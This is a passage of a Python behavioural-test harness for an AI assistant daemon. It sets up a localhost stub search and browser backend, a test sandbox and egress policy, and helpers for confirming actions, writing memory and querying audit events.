            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/restaurant/amour":
            body = (
                b"<html><head><title>Amour - Tabelog</title></head><body>"
                b"<h1>Amour</h1>"
                b"<p>Restaurant-specific reservation page.</p>"
                b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/browser-form":
            body = (
                b"<html><head><title>Browser Form</title></head><body>"
                b"<h1>Browser Form</h1>"
                b"<form action='/browser-submitted' method='get'>"
                b"<label for='name'>Name</label>"
                b"<input id='name' name='name' />"
                b"<button id='send' type='submit'>Send</button>"
                b"</form>"
                b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path == "/browser-submitted":
            qs = parse_qs(parsed.query)
            submitted = qs.get("name", [""])[0]
            body = (
                b"<html><head><title>Browser Submitted</title></head><body>"
                + f"Submitted: {submitted}".encode()
                + b"</body></html>"
            )
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if parsed.path != "/search":
            body = b"stub page content for behavioral test"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        qs = parse_qs(parsed.query)
        query = (qs.get("q") or [""])[0]
        if "gh29 amour tabelog navigation" in query.casefold():
            host = self.headers.get("Host", "localhost")
            specific_url = f"http://{host}/restaurant/amour"
            homepage_url = f"http://{host}/"
            payload = {
                "results": [
                    {
                        "title": "Amour - Tabelog",
                        "url": specific_url,
                        "content": "Restaurant-specific reservation page.",
                        "engine": "stub",
                    },
                    {
                        "title": "Tabelog home",
                        "url": homepage_url,
                        "content": "Generic site homepage.",
                        "engine": "stub",
                    },
                ]
            }
            body = json.dumps(payload, ensure_ascii=True).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        payload = {
            "results": [
                {
                    "title": f"stub result for: {query}",
                    "url": "https://example.com/stub",
                    "content": "stub snippet",
                    "engine": "stub",
                }
            ]
        }
        body = json.dumps(payload, ensure_ascii=True).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt: str, *args: object) -> None:
        _ = fmt, args


def _start_stub_search_backend() -> tuple[ThreadingHTTPServer, threading.Thread, str, int]:
    server = ThreadingHTTPServer(("127.0.0.1", 0), _StubSearchHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    _host, port = server.server_address
    return server, thread, f"http://localhost:{port}", int(port)


_extract_tool_outputs = extract_tool_outputs
_production_sandbox_execute_async = SandboxOrchestrator.execute_async


@dataclass(frozen=True, slots=True)
class ContractHarness:
    client: ControlClient
    config: DaemonConfig
    workspace_root: Path
    web_search_backend_url: str
    browser_base_url: str


def _executable_fake_browser_command(tmp_path: Path) -> str:
    source = Path(__file__).resolve().parents[1] / "fixtures" / "fake_playwright_cli.py"
    target = tmp_path / "fake_playwright_cli.py"
    shutil.copy2(source, target)
    target.chmod(0o755)
    return str(target)


async def _execute_fake_browser_with_explicit_test_posture(
    self: SandboxOrchestrator,
    config: SandboxConfig,
    *,
    session: Any | None = None,
) -> SandboxResult:
    if any(Path(part).name == "fake_playwright_cli.py" for part in config.command):
        config = config.model_copy(
            update={"containment_profile": ContainmentProfile.EXPERT_HOST_FALLBACK}
        )
    return await _production_sandbox_execute_async(self, config, session=session)


@asynccontextmanager
async def _contract_harness_context(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    *,
    prestart: Callable[[DaemonConfig], None] | None = None,
    default_require_confirmation: bool = False,
    web_search_backend_configured: bool = True,
    web_search_backend_url_override: str | None = None,
    policy_egress_allowed: bool = True,
    browser_enabled: bool | None = None,
    browser_allowed_domains: list[str] | None = None,
    policy_extra_lines: list[str] | None = None,
    context_window: int = 1,
) -> AsyncIterator[ContractHarness]:
    server: ThreadingHTTPServer | None = None
    thread: threading.Thread | None = None
    backend_url = ""
    backend_port = 0
    if web_search_backend_configured:
        server, thread, backend_url, backend_port = _start_stub_search_backend()
    if web_search_backend_url_override is not None:
        backend_url = web_search_backend_url_override
        backend_port = int(urlparse(backend_url).port or 0)
    workspace_root = tmp_path / "workspace"
    workspace_root.mkdir(parents=True, exist_ok=True)
    (workspace_root / "README.md").write_text("behavioral-readme\n", encoding="utf-8")

    egress_lines = (
        [
            "egress:",
            '  - host: "localhost"',
            f"    ports: [{backend_port}]",
            '    protocols: ["http"]',
        ]
        if policy_egress_allowed and backend_port
        else ["egress: []"]
    )
    policy_text = (
        "\n".join(
            [
                'version: "1"',
                f"default_require_confirmation: {str(default_require_confirmation).lower()}",
                "sandbox:",
                "  containment_profile: expert_host_fallback",
                "safe_output_domains:",
                '  - "localhost"',
                '  - "example.com"',
                *egress_lines,
                *(policy_extra_lines or []),
            ]
        )
        + "\n"
    )

    _force_deterministic_local_planner(monkeypatch=monkeypatch)
    monkeypatch.setattr(
        SandboxOrchestrator,
        "execute_async",
        _execute_fake_browser_with_explicit_test_posture,
    )

    try:
        async with daemon_harness(
            tmp_path,
            policy_text=policy_text,
            config_kwargs={
                "log_level": "WARNING",
                "context_window": context_window,
                "web_search_enabled": True,
                "web_search_backend_url": backend_url,
                "web_allowed_domains": ["127.0.0.1", "localhost"],
                "browser_enabled": web_search_backend_configured
                if browser_enabled is None
                else browser_enabled,
                "browser_command": _executable_fake_browser_command(tmp_path),
                "browser_allowed_domains": browser_allowed_domains or ["127.0.0.1", "localhost"],
                "browser_require_hardened_isolation": False,
                "assistant_fs_roots": [workspace_root],
            },
            prestart=prestart,
        ) as harness:
            yield ContractHarness(
                client=harness.client,
                config=harness.config,
                workspace_root=workspace_root,
                web_search_backend_url=backend_url,
                browser_base_url=backend_url,
            )
    finally:
        if server is not None:
            server.shutdown()
            server.server_close()
        if thread is not None:
            with suppress(Exception):
                thread.join(timeout=1.0)


async def _create_session(
    client: ControlClient,
    *,
    channel: str = "cli",
    user_id: str = "alice",
    workspace_id: str = "ws1",
) -> str:
    created = await client.call(
        "session.create",
        {"channel": channel, "user_id": user_id, "workspace_id": workspace_id},
    )
    return str(created["session_id"])


async def _confirm_pending_action(
    client: ControlClient,
    confirmation_id: str,
) -> dict[str, Any]:
    """Fetch decision nonce for a pending action and confirm it (with cooldown retry)."""
    end = asyncio.get_running_loop().time() + 5.0
    latest: dict[str, Any] = {
        "confirmed": False,
        "confirmation_id": confirmation_id,
        "reason": "unknown",
    }
    while asyncio.get_running_loop().time() < end:
        pending = await client.call(
            "action.pending",
            {"confirmation_id": confirmation_id},
        )
        actions = pending.get("actions", [])
        assert actions, f"No pending action found for {confirmation_id}"
        nonce = str(actions[0].get("decision_nonce", "")).strip()
        assert nonce, f"Missing decision_nonce for {confirmation_id}"
        latest = dict(
            await client.call(
                "action.confirm",
                {"confirmation_id": confirmation_id, "decision_nonce": nonce},
            )
        )
        if latest.get("confirmed") is True:
            return latest
        if latest.get("reason") != "cooldown_active":
            return latest
        retry_after = float(latest.get("retry_after_seconds", 0.1) or 0.1)
        await asyncio.sleep(max(0.05, retry_after))
    raise AssertionError(f"Timed out confirming pending action {confirmation_id}: {latest}")


async def _reject_pending_action(
    client: ControlClient,
    confirmation_id: str,
) -> dict[str, Any]:
    """Fetch decision nonce for a pending action and reject it."""
    pending = await client.call(
        "action.pending",
        {"confirmation_id": confirmation_id},
    )
    actions = pending.get("actions", [])
    assert actions, f"No pending action found for {confirmation_id}"
    nonce = str(actions[0].get("decision_nonce", "")).strip()
    assert nonce, f"Missing decision_nonce for {confirmation_id}"
    result = await client.call(
        "action.reject",
        {"confirmation_id": confirmation_id, "decision_nonce": nonce},
    )
    return dict(result)


async def _mint_memory_ingress_context(
    client: ControlClient,
    *,
    content: Any,
    source_type: str = "user",
    source_id: str = "",
    user_confirmed: bool = False,
) -> dict[str, Any]:
    payload: dict[str, Any] = {"content": content, "source_type": source_type}
    if source_id:
        payload["source_id"] = source_id
    if user_confirmed:
        payload["user_confirmed"] = True
    return dict(await client.call("memory.mint_ingress_context", payload))


async def _write_memory_via_ingress(
    client: ControlClient,
    *,
    entry_type: str,
    key: str,
    value: Any,
    source_type: str = "user",
    source_id: str = "",
    user_confirmed: bool = False,
    **extra: Any,
) -> dict[str, Any]:
    minted = await _mint_memory_ingress_context(
        client,
        content=value,
        source_type=source_type,
        source_id=source_id,
        user_confirmed=user_confirmed,
    )
    payload: dict[str, Any] = {
        "ingress_context": minted["ingress_context"],
        "entry_type": entry_type,
        "key": key,
        "value": value,
        **extra,
    }
    return dict(await client.call("memory.write", payload))


async def _run_contract_cli(config: DaemonConfig, *args: str) -> subprocess.CompletedProcess[str]:
    repo_root = Path(__file__).resolve().parents[2]
    env = os.environ.copy()
    env.update(
        {
            "SHISAD_DATA_DIR": str(config.data_dir),
            "SHISAD_SOCKET_PATH": str(config.socket_path),
            "SHISAD_POLICY_PATH": str(config.policy_path),
            "SHISAD_ENV_FILE": "",
        }
    )
    command = [sys.executable, "-m", "shisad.cli.main", "--no-color", *args]
    process = await asyncio.create_subprocess_exec(
        *command,
        cwd=repo_root,
        env=env,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=10)
    except TimeoutError:
        process.kill()
        await process.wait()
        raise
    return subprocess.CompletedProcess(
        args=command,
        returncode=int(process.returncode or 0),
        stdout=stdout.decode(errors="replace"),
        stderr=stderr.decode(errors="replace"),
    )


def _set_retrieval_owner(
    config: DaemonConfig,
    *chunk_ids: str,
    user_id: str = "alice",
    workspace_id: str = "ws1",
) -> None:
    db_path = config.data_dir / "memory_entries" / "memory.sqlite3"
    with sqlite3.connect(db_path) as conn:
        for chunk_id in chunk_ids:
            conn.execute(
                """
                UPDATE retrieval_records
                SET user_id = ?, workspace_id = ?
                WHERE chunk_id = ?
                """,
                (user_id, workspace_id, chunk_id),
            )


async def _wait_for_audit_event(
    client: ControlClient,
    *,
    event_type: str,
    predicate: Callable[[dict[str, Any]], bool],
    session_id: str = "",
    timeout: float = 4.0,
) -> dict[str, Any]:
    end = asyncio.get_running_loop().time() + timeout
    latest: list[dict[str, Any]] = []
    while asyncio.get_running_loop().time() < end:
        payload: dict[str, Any] = {"event_type": event_type, "limit": 50}
        if session_id:
            payload["session_id"] = session_id
        result = await client.call("audit.query", payload)
        latest = [dict(event) for event in result.get("events", [])]
        for event in latest:
            if predicate(event):
                return event
        await asyncio.sleep(0.1)
    raise AssertionError(f"Timed out waiting for {event_type}: {latest}")
